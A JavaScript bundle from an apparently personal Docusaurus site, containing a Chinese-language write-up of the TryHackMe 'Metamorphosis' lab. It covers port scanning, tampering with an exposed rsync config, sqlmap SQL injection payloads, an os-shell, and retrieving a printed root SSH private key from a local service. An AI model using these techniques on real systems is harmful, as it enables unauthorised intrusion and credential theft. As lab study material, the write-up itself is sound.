"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9604],{63459:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>a,metadata:()=>o,toc:()=>l});var t=s(74848),r=s(28453);const a={sidebar_position:132,tags:["Easy","Linux","SQLI","\u4fe1\u606f\u6cc4\u9732"],title:"Metamorphosis",description:"Metamorphosis",sidebar_label:"Metamorphosis",slug:"/tryhackme/132"},i="Metamorphosis",o={id:"box/TryHackMe/132",title:"Metamorphosis",description:"Metamorphosis",source:"@site/docs/box/TryHackMe/132.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/132",permalink:"/docs/tryhackme/132",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"}],version:"current",sidebarPosition:132,frontMatter:{sidebar_position:132,tags:["Easy","Linux","SQLI","\u4fe1\u606f\u6cc4\u9732"],title:"Metamorphosis",description:"Metamorphosis",sidebar_label:"Metamorphosis",slug:"/tryhackme/132"},sidebar:"boxSidebar",previous:{title:"Weasel",permalink:"/docs/tryhackme/131"},next:{title:"Ghizer",permalink:"/docs/tryhackme/133"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"873",id:"873",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; root",id:"www-data--root",level:3}];function d(n){const e={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h1,{id:"metamorphosis",children:"Metamorphosis"}),"\n",(0,t.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/metamorphosis# nmap -sTCV -p- --min-rate 1000 10.10.101.87\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-03 06:36 BST\nNmap scan report for ip-10-10-101-87.eu-west-1.compute.internal (10.10.101.87)\nHost is up (0.00043s latency).\nNot shown: 65530 closed ports\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)\n|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)\n|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (EdDSA)\n80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\n873/tcp open  rsync       (protocol version 31)\nMAC Address: 02:95:7A:8D:9D:89 (Unknown)\nService Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: incognito\n|   NetBIOS computer name: INCOGNITO\\x00\n|   Domain name: \\x00\n|   FQDN: incognito\n|_  System time: 2023-10-03T05:36:46+00:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2023-10-03 06:36:46\n|_  start_date: 1600-12-31 23:58:45\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.81 seconds\n"})}),"\n",(0,t.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/metamorphosis# gobuster dir -u http://10.10.101.87/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.101.87/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/10/03 06:51:51 Starting gobuster\n===============================================================\n/index.php (Status: 200)\n/admin (Status: 301)\n/inde.html (Status: 200)\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u7ecf\u8fc7\u76ee\u5f55\u626b\u63cf\u4e4b\u540e, \u6211\u53d1\u73b0\u6211\u5e76\u4e0d\u80fd\u8bbf\u95ee admin \u76ee\u5f55, \u6211\u5c1d\u8bd5\u4e86 XFF \u7b49\u63aa\u65bd\u4f46\u662f\u8fd8\u662f\u6ca1\u6709\u529e\u6cd5\u8bbf\u95ee"}),"\n",(0,t.jsx)(e.h2,{id:"873",children:"873"}),"\n",(0,t.jsx)(e.p,{children:"\u6211\u4eec\u9488\u5bf9\u6b64\u670d\u52a1\u8fdb\u884c\u4e00\u4e9b\u653b\u51fb, \u9996\u5148\u7ecf\u8fc7\u679a\u4e3e\u6211\u5df2\u7ecf\u77e5\u9053\u4e86"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-139-140:~/metamorphosis# nmap -sV --script "rsync-list-modules" -p 873 10.10.101.87\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-03 06:41 BST\nNmap scan report for ip-10-10-101-87.eu-west-1.compute.internal (10.10.101.87)\nHost is up (0.00014s latency).\n\nPORT    STATE SERVICE VERSION\n873/tcp open  rsync   (protocol version 31)\n| rsync-list-modules: \n|_  Conf           \tAll Confs\nMAC Address: 02:95:7A:8D:9D:89 (Unknown)\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u4ece\u540d\u5b57\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u8fd9\u5e94\u8be5\u662f\u4e00\u4e9b\u914d\u7f6e\u6587\u4ef6, \u63a5\u7740\u6211\u5c06\u5176\u8fdb\u884c\u4e86\u679a\u4e3e\u5e76\u4e0b\u8f7d\u5230\u672c\u5730"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/metamorphosis# rsync -av --list-only rsync://10.10.101.87/Conf\nreceiving incremental file list\ndrwxrwxrwx          4,096 2023/10/03 07:15:34 .\n-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf\n-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini\n-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf\n-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf\n-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf\n-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini\n-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini\n-rw-r--r--            320 2021/04/09 21:03:16 ports.conf\n-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf\n-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf\n-rw-r--r--          9,648 2023/10/03 07:10:28 smb.conf\n-rw-rw-r--             72 2023/10/03 07:15:32 webapp.ini\n\nsent 20 bytes  received 378 bytes  796.00 bytes/sec\ntotal size is 193,536  speedup is 486.27\nroot@ip-10-10-139-140:~/metamorphosis# rsync -av  rsync://10.10.101.87/Conf ./rsyn/\nroot@ip-10-10-139-140:~/metamorphosis/rsyn# ls\naccess.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u67e5\u770b\u5176\u4e2d\u7684\u6587\u4ef6\u65f6,\u6211\u53d1\u73b0\u4e00\u4e2a webapp,ini \u8fd9\u5e94\u8be5\u65f6\u6211\u4eec\u670d\u52a1\u7684\u914d\u7f6e\u6587\u4ef6, \u67e5\u770b\u5176\u4e2d\u5185\u5bb9, \u5176\u4e2d\u7684 env \u8868\u793a\u7684\u662f\u751f\u6210\u73af\u5883, \u6240\u4ee5\u6211\u5c06\u5176\u8f6c\u6362\u5f00\u53d1\u73af\u5883\u5e76\u8fdb\u884c\u4e86\u4e0a\u4f20, \u53d1\u73b0\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u8bbf\u95ee\u6211\u4eec\u7684 admin \u754c\u9762"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/metamorphosis/rsyn# cat webapp.ini \n[Web_App]\nenv = prod\nuser = tom\npassword = theCat\n\n[Details]\nLocal = No\n\nroot@ip-10-10-139-140:~/metamorphosis/rsyn# cat webapp.ini \n[Web_App]\nenv = dev\nuser = tom\npassword = theCat\n\n[Details]\nLocal = Yes\nroot@ip-10-10-139-140:~/metamorphosis/rsyn# rsync -av webapp.ini rsync://10.10.101.87/Conf/webapp.ini\nsending incremental file list\nwebapp.ini\n\nsent 188 bytes  received 41 bytes  458.00 bytes/sec\ntotal size is 73  speedup is 0.32\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-152839.png",alt:"image-20240709152837902"})}),"\n",(0,t.jsx)(e.p,{children:"\u7ecf\u8fc7\u5206\u6790\u6211\u5224\u65ad\u8fd9\u662f\u5b58\u5728 sqli \u6f0f\u6d1e\u76f4\u63a5\u4f7f\u7528 sqlmap \u5f00\u8dd1, \u53d1\u73b0\u786e\u5b9e\u5b58\u5728 sqli"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-139-140:~/metamorphosis# sqlmap -u http://10.10.101.87/admin/config.php --data "username=tom" -X POST --risk 3 --level 3\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: username=tom" AND 5034=5034 AND "gksU"="gksU\n\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: username=tom" AND SLEEP(5) AND "RRqn"="RRqn\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: username=tom" UNION ALL SELECT NULL,CONCAT(0x71706a7071,0x6d514668504d73636e6153574d724c6e726d514651547a626b76664e6e70655a674d766c68557144,0x7170707071),NULL-- rRoL\n---\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u6211\u5728\u6b64\u76f4\u63a5\u62d6\u5e93\u4f46\u662f\u6ca1\u6709\u53d1\u73b0\u4efb\u4f55\u53ef\u4ee5\u5229\u7528\u7684\u5730\u65b9, \u63a5\u7740\u6211\u4fbf\u5c1d\u8bd5\u5199\u5165 WebShell \u53d1\u73b0\u53ef\u4ee5\u5199\u5165"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/metamorphosis# sqlmap -u http://10.10.101.87/admin/config.php --data \"username=tom\" -X POST --risk 3 --level 3 --os-shell\nos-shell> id\ndo you want to retrieve the command standard output? [Y/n/a] y\ncommand standard output:    'uid=33(www-data) gid=33(www-data) groups=33(www-data)'\n"})}),"\n",(0,t.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(e.h3,{id:"www-data",children:"www-data"}),"\n",(0,t.jsx)(e.p,{children:"\u5229\u7528\u4e0a\u9762\u83b7\u53d6\u5230\u7684 Shell \u83b7\u53d6\u4e00\u4e2a\u53cd\u5411 Shell"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-152859.png",alt:"image-20240709152858384"})}),"\n",(0,t.jsx)(e.h3,{id:"www-data--root",children:"www-data \u2014> root"}),"\n",(0,t.jsx)(e.p,{children:"\u76d1\u89c6\u540e\u53f0\u8fdb\u7a0b\u6211\u53d1\u73b0\u4e00\u4e9b\u7279\u6b8a\u7684\u5185\u5bb9"}),"\n",(0,t.jsxs)(e.ul,{children:["\n",(0,t.jsx)(e.li,{children:"\u8fd9\u91cc\u5b9a\u65f6\u6267\u884c\u4e86\u4e24\u4e2a\u811a\u672c\u4f46\u662f\u90fd\u5728 root \u76ee\u5f55\u4e0b, \u6ca1\u6709\u6743\u9650\u8bbf\u95ee"}),"\n",(0,t.jsx)(e.li,{children:"\u5b58\u5728\u4e00\u4e2a curl \u8fde\u63a5, \u6839\u636e\u4e24\u4e2a\u811a\u672c\u7684\u540d\u5b57\u6211\u63a8\u6d4b\u8fd9\u4e2a\u8bf7\u6c42\u4f30\u8ba1\u5c31\u662f\u8fd9\u4e2a\u811a\u672c\u542f\u52a8\u7684\u670d\u52a1"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-152913.png",alt:"image-20240709152912388"})}),"\n",(0,t.jsx)(e.p,{children:"\u8bbf\u95ee\u6211\u4eec\u7684\u94fe\u63a5, \u6211\u53d1\u73b0\u5176\u76f4\u63a5\u8fd4\u56de\u7ed9\u6211\u4e00\u4e2a SSH \u7684\u79c1\u94a5, \u6240\u4ee5\u6211\u5c06\u5176\u4fdd\u5b58\u5230\u672c\u5730\u5e76\u5c1d\u8bd5\u767b\u9646\u53d1\u73b0\u662f\u4e00\u4e2a root \u7528\u6237\u7684 SSH"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"(remote) www-data@incognito:/tmp$ curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj\nrt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k\nwJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ\n5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx\nqrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14\nK2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU\n09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg\nv0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef\nU9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9\nmH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u\njLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa\n9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V\n63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1\ntykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm\nFhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1\nL4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw\ncIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN\n28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3\nLX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3\nsZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp\nmqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3\nvIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk\nGPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6\nClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v\nQIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==\n-----END RSA PRIVATE KEY-----\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-152920.png",alt:"image-20240709152918785"})})]})}function p(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(d,{...n})}):d(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>i,x:()=>o});var t=s(96540);const r={},a=t.createContext(r);function i(n){const e=t.useContext(a);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:i(n.components),t.createElement(a.Provider,{value:e},n.children)}}}]);